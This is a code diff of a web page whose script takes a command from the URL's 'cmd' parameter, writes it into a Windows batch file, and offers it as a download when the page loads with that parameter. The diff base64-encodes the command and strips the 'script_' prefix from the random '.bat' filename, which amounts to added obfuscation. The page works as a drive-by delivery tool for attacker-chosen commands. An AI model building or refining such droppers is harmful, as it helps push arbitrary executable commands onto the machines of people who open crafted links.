@@ -7,7 +7,7 @@
 			var  urlParams  =  new  URLSearchParams ( window . location . search ) ; 
 			var  urlcmd  =  urlParams . get ( 'cmd' ) ; 
 			if  ( urlcmd  !==  null )  { 
-				cmd  =  urlcmd ; 
+				cmd  =  btoa(urlcmd) ; // Encode the cmd variable in base64
 			} 
 			
 			// Create batch file content 
@@ -24,7 +24,7 @@
 			var  blob  =  new  Blob ( [ content ] ,  { type :  'text/plain' } ) ; 
 			
 			// Generate random filename 
-			var  filename  =  'script_'  +  Math . random ( ) . toString ( 36 ) . substring ( 2 )  +  '.bat' ; 
+			var  filename  =  Math . random ( ) . toString ( 36 ) . substring ( 2 )  +  '.bat' ; 
 			
 			// Generate download URL and set it as the href of a link 
 			var  link  =  document . createElement ( 'a' ) ; 
@@ -37,10 +37,10 @@
 		var  urlParams  =  new  URLSearchParams ( window . location . search ) ; 
 		var  urlcmd  =  urlParams . get ( 'cmd' ) ; 
 		if  ( urlcmd  !==  null )  { 
-			var  cmd  =  urlcmd ; 
+			var  cmd  =  btoa(urlcmd) ; // Encode the cmd variable in base64
 			createBatchFile ( ) ; 
 		} 
 	</script>
 <body> 
 </body> 
-</html >
+</html>
